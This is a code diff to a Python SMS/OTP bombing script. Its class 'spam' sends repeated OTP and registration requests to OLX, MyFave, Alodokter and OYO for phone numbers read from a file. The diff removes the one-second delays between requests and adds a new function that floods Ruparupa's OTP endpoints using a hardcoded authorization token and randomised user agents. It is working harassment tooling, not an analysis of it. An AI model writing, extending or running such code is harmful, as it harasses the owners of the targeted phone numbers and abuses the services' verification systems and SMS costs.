@@ -37,8 +37,7 @@ def panggil():
 
 class spam:
     def olx(nom):
-        for i in range(5):
-            time.sleep(1)
+        for i in range(3):
             headers = {
                 "accept": "*/*",
                 "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
@@ -54,8 +53,7 @@ class spam:
                                     data=data, headers=headers).text
 
     def fav(nom):
-        for i in range(5):
-            time.sleep(1)
+        for i in range(3):
             hd = {
                 "Host": "api.myfave.com",
                 "Connection": "keep-alive",
@@ -73,8 +71,7 @@ class spam:
                           data=json.dumps(dat), headers=hd).text
 
     def alodokter(nom):
-        for i in range(5):
-            time.sleep(1)
+        for i in range(3):
             r = requests.Session()
             r.headers.update(
                 {'referer': 'https://www.alodokter.com/login-alodokter'})
@@ -93,8 +90,7 @@ class spam:
                    headers=hd, json={"user": {"phone": "0"+nom}})
 
     def oyo(nom):
-        for i in range(5):
-            time.sleep(1)
+        for i in range(3):
             r = requests.Session()
             hd = {
                 "Host": "identity-gateway.oyorooms.com",
@@ -112,6 +108,47 @@ class spam:
                               "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"})
             r.post(
                 "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", headers=hd, data=dat)
+
+    def ruparupa(nom):
+        for i in range(3):
+            url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
+            url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
+            hdurl = {
+                'accept': 'application/json',
+                'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
+                'content-length': '88',
+                'content-type': 'application/json',                                                                                                          'origin': 'https://m.ruparupa.com',
+                'referer': 'https://m.ruparupa.com/my-account',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': ua.random,
+                'user-platform': 'mobile',
+                'x-company-name': 'odi',                                                                                                                     'x-frontend-type': 'mobile',
+            }
+            hdurl2 = {
+                'accept': 'application/json',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
+                'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
+                'content-length': '103',
+                'content-type': 'application/json',
+                'origin': 'https://ruparupa.com',
+                'referer': 'https://ruparupa.com/verification?page=otp-choices',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': ua.random,
+                'user-platform': 'mobile',
+                'x-company-name': 'odi',
+                'x-frontend-type': 'mobile',
+            }
+            dataurl = {"phone": "0"+nom, "email": "ubetubed@gmail.com",
+                       "action": "register", "password": ""}
+            dataurljson = json.dumps(dataurl)
+            dataurl2 = {"phone": "0"+nom, "action": "register",
+                        "channel": "chat", "email": "", "customer_id": "0", "is_resend": 0}
+            dataurl2json = json.dumps(dataurl2)
+            requests.post(url, headers=hdurl, data=dataurljson).text
+            requests.post(url2, headers=hdurl2, data=dataurl2json).text
 
 
 def tmpl():
@@ -146,12 +183,14 @@ def sms(file):
                 spam.alodokter(nom)
                 spam.oyo(nom)
                 spam.olx(nom)
-                print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lr}{on}{c.lp}\n")
+                spam.ruparupa(nom)
+                print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lc}{on}{c.lp}\n")
             elif len(nom) >= 10:
                 spam.fav(nom)
                 spam.alodokter(nom)
                 spam.oyo(nom)
                 spam.olx(nom)
+                spam.ruparupa(nom)
                 print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lr}{on}{c.lp}\n")
         ojk.close()
     except AttributeError:
